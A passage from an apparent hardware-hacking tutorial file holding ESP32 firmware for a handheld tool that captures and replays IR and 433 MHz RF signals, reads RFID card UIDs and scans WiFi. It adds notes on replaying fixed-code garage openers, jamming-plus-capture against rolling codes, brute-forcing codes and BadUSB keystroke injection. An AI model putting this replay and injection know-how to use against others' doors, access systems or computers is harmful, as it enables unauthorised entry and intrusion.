       char m[28]; snprintf(m, 28, "Proto:%d  %08lX", irData.decode_type, (unsigned long)irData.value);\n            statusScr("IR CAPTURED", m, "OK=replay", C_GREEN);\n            irRecv.resume(); return;\n        }\n        delay(50);\n    }\n    statusScr("IR CAPTURE", "No signal", "10s timeout", C_RED); delay(1500);\n}\n\nvoid irReplay() {\n    if (!hasIR) { statusScr("IR REPLAY", "No data", "Capture first", C_RED); delay(1500); return; }\n    irSend.begin();\n    irSend.send(irData.decode_type, irData.value, irData.bits);\n    statusScr("IR REPLAY", "Signal sent!", "", C_GREEN); delay(1000);\n}\n\nvoid wifiScan() {\n    statusScr("WIFI SCAN", "Scanning...", "");\n    WiFi.mode(WIFI_STA); WiFi.disconnect();\n    int n = WiFi.scanNetworks(false, true);\n    tft.fillScreen(C_BG);\n    tft.fillRect(0, 0, 160, 18, C_ACCENT);\n    tft.setTextColor(C_BG); tft.setTextSize(1);\n    tft.setCursor(4, 5); tft.printf("WIFI: %d APs", n);\n    tft.setTextColor(C_WHITE);\n    for (int i = 0; i < min(n, 5); i++) {\n        tft.setCursor(4, 22 + i*18);\n        String s = WiFi.SSID(i); if (s.length() > 14) s = s.substring(0,14);\n        tft.printf("%-14s %3d", s.c_str(), WiFi.RSSI(i));\n    }\n    tft.setTextColor(C_DIM); tft.setCursor(4, 120); tft.print("LEFT=back");\n    WiFi.scanDelete(); waitBtn(15000);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    for (int p : {BTN_UP,BTN_DN,BTN_LT,BTN_RT,BTN_OK}) pinMode(p, INPUT_PULLUP);\n    tft.initR(INITR_BLACKTAB); tft.setRotation(1);\n    tft.fillScreen(C_BG);\n    tft.setTextColor(C_ACCENT); tft.setTextSize(1);\n    tft.setCursor(4, 20); tft.println("SG-42 MULTI-TOOL");\n    tft.setTextColor(C_WHITE); tft.setCursor(4, 36); tft.println("Initializing...");\n    spi2.begin(RC522_SCK, RC522_MISO, RC522_MOSI, RC522_CS);\n    rfid.PCD_Init();\n    delay(800);\n    drawMenu(mainItems, 4, 0, "SG-42 MULTI-TOOL");\n}\n\nvoid loop() {\n    Btns b = readBtns();\n    if (!b.up&&!b.dn&&!b.lt&&!b.rt&&!b.ok) { delay(20); return; }\n    switch (state) {\n        case MENU_MAIN:\n            if (b.up && midx > 0) { midx--; drawMenu(mainItems, 4, midx, "SG-42 MULTI-TOOL"); }\n            if (b.dn && midx < 3) { midx++; drawMenu(mainItems, 4, midx, "SG-42 MULTI-TOOL"); }\n            if (b.ok) {\n                if (midx==0) { state=MENU_RF;   midx=0; drawMenu(rfItems, 3, 0, "SUB-GHz RF"); }\n                if (midx==1) { statusScr("RFID READ","Hold card...",""); rfid.PCD_Init();\n                    unsigned long t=millis();\n                    while(millis()-t<10000){\n                        if(rfid.PICC_IsNewCardPresent()&&rfid.PICC_ReadCardSerial()){\n                            char m[24]; snprintf(m,24,"UID: %02X %02X %02X %02X",\n                                rfid.uid.uidByte[0],rfid.uid.uidByte[1],\n                                rfid.uid.uidByte[2],rfid.uid.uidByte[3]);\n                            statusScr("RFID READ", m, "", C_GREEN);\n                            rfid.PICC_HaltA(); rfid.PCD_StopCrypto1();\n                            delay(2000); break;\n                        }\n                    }\n                    state=MENU_MAIN; midx=1; drawMenu(mainItems, 4, midx, "SG-42 MULTI-TOOL"); }\n                if (midx==2) { state=MENU_IR;   midx=0; drawMenu(irItems, 3, 0, "INFRARED"); }\n                if (midx==3) { wifiScan(); state=MENU_MAIN; midx=3; drawMenu(mainItems,4,3,"SG-42 MULTI-TOOL"); }\n            }\n            break;\n        case MENU_RF:\n            if (b.up && midx > 0) { midx--; drawMenu(rfItems, 3, midx, "SUB-GHz RF"); }\n            if (b.dn && midx < 2) { midx++; drawMenu(rfItems, 3, midx, "SUB-GHz RF"); }\n            if (b.ok) {\n                if (midx==0) rfCapture();\n                if (midx==1) rfReplay();\n                if (midx==2) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); return; }\n                drawMenu(rfItems, 3, midx, "SUB-GHz RF");\n            }\n            if (b.lt) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); }\n            break;\n        case MENU_IR:\n            if (b.up && midx > 0) { midx--; drawMenu(irItems, 3, midx, "INFRARED"); }\n            if (b.dn && midx < 2) { midx++; drawMenu(irItems, 3, midx, "INFRARED"); }\n            if (b.ok) {\n                if (midx==0) irCapture();\n                if (midx==1) irReplay();\n                if (midx==2) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); return; }\n                drawMenu(irItems, 3, midx, "INFRARED");\n            }\n            if (b.lt) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); }\n            break;\n        default:\n            state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); break;\n    }\n    delay(150);\n}',
                language: 'Arduino (C++)',
                tip: 'Compile settings: Board=ESP32S3 Dev Module, Flash Size=8MB (if your module has it), PSRAM=OPI PSRAM, Upload Speed=921600. If you get "multiple definition" linker errors, ensure IRremoteESP8266 is only included in the main .ino file and not in any additional .cpp files.'
            },
            {
                title: 'Understand Rolling Codes and Their Limits',
                content: '<p>Most post-1995 garage door openers use KeeLoq rolling codes &mdash; each button press produces a unique code that the receiver validates using a synchronized counter. Simple capture-and-replay does NOT work against rolling codes. What the SG-42 CAN do:</p>' +
                         '<ul><li>Identify legacy fixed-code systems (pre-1995, still common in older buildings) that are directly vulnerable to replay</li><li>Capture raw signals for offline analysis in Universal Radio Hacker (URH)</li><li>Identify the RF modulation type, frequency, and data rate for reporting purposes</li><li>Execute a "jamming + capture" attack against rolling codes in some scenarios (advanced &mdash; requires two radios operating simultaneously)</li></ul>',
                code: '# Analyze captured RF signals offline with Universal Radio Hacker\npip install urh\nurh   # Opens the GUI -- load the .iq file and run the demodulation wizard\n\n# Quick check on a captured OOK signal from a binary dump:\npython3 -c "\n# Read raw bytes captured by CC1101 and look for repeating patterns\nwith open(\'rf_capture.bin\', \'rb\') as f:\n    data = f.read()\nprint(f\'Capture: {len(data)} bytes\')\nprint(f\'Hex: {data[:64].hex()}\')  # First 64 bytes\n# Look for preamble: alternating 0x55/0xAA = Manchester-coded preamble\n# Fixed code systems repeat the same pattern 3-5 times per button press\n"\n\n# Decode KeeLoq structure (NOT cracking -- just protocol identification)\npython3 -c "\nimport struct\n# KeeLoq frame structure (simplified):\n# Preamble (12 bits alternating) | Sync (1) | Encrypted payload (32 bits)\n# | Serial number (28 bits) | Button code (4 bits) | Repeat count (2 bits)\nprint(\'KeeLoq rolling codes require manufacturer key for decryption\')\nprint(\'Fixed-code systems: same payload every press -- vulnerable to replay\')\nprint(\'Use a logic analyzer and URH to identify which system type you have\')\n"',
                language: 'Python 3 / Shell',
                tip: 'Universal Radio Hacker (URH) is the essential tool for offline RF analysis. It demodulates captured signals, identifies protocols, and can brute-force fixed-code systems. For rolling-code analysis, Proxmark3 with the KeeLoq plugin or the RFCrack tool against captured samples are the next steps after identifying the system type with the SG-42.'
            }
        ],

        testing: '<p><strong>Full verification checklist:</strong></p>' +
                 '<ol><li>TFT shows main menu with 4 options after boot</li><li>UP/DOWN navigation scrolls through all menu items with highlight</li><li>LEFT button returns to main menu from sub-menus</li><li>WiFi Scan returns a list of nearby networks (SSID and RSSI) within 5 seconds</li><li>IR Capture records a signal when a TV remote is pointed at the TSOP38238 and a button is pressed</li><li>IR Replay re-transmits and operates the device (TV volume, AC temperature, etc.)</li><li>RF Capture shows "N bytes captured" when a 433 MHz remote (wireless doorbell, keyfob) is pressed within 50cm of the CC1101 antenna</li><li>RF Replay retransmits and triggers the original device (verify with a doorbell or similar)</li><li>RFID Read detects a MIFARE card placed on the RC522 and displays the UID</li></ol>',

        troubleshooting: '<p><strong>TFT and CC1101 corrupt each other:</strong> Add 100nF bypass capacitors on each module VCC pin. Verify TFT_CS=2 and CC1101_CS=5 are both correct and that the library\'s default SS pin was changed. Test each device independently first.</p>' +
                         '<p><strong>CC1101 ReceiveData returns 0 always:</strong> Check GDO0 connection (GPIO4). Without GDO0, the sketch cannot detect when data is available in the FIFO. The GDO0 pin must connect to GPIO4. Also verify the antenna is attached &mdash; even a 17cm wire dramatically increases range.</p>' +
                         '<p><strong>IR codes not recognized:</strong> The TSOP38238 receiver needs a 100nF capacitor between VCC and GND placed within 1cm of the receiver IC. Without it, the output is noisy. Also ensure you are not in a room with strong fluorescent lighting (50/60 Hz IR noise).</p>' +
                         '<p><strong>RC522 not responding on HSPI:</strong> The <code>SPIClass spi2(HSPI)</code> must be initialized with <code>spi2.begin(SCK, MISO, MOSI, CS)</code> using your custom pin assignments before <code>rfid.PCD_Init()</code>. The standard <code>SPI.begin()</code> call only configures the default VSPI bus.</p>',

        challenges: '<p><strong>Push the build further:</strong></p>' +
                    '<ul><li>Add a MicroSD card module (SPI1/VSPI, CS=GPIO1 or any free GPIO) to persist captured RF signals, IR codes, and RFID dumps across power cycles &mdash; the SD card enables the device to store and replay dozens of signals without needing a PC</li><li>Implement the BadUSB HID injection feature: when connected to a PC via USB, the ESP32-S3 enumerates as a keyboard and executes DuckyScript payloads stored on the SD card (combine with SG-33 knowledge)</li><li>Add 915 MHz support for US ISM band devices (temperature sensors, smart meters, Z-Wave devices) by changing SetMHZ(433.92) to SetMHZ(915.00)</li><li>Implement Wiegand 26-bit protocol decoding: use the GPIO interrupt handler to capture the DATA0 and DATA1 lines from a standard proximity card reader and decode the facility code and card number without an RC522</li></ul>'
    }

};
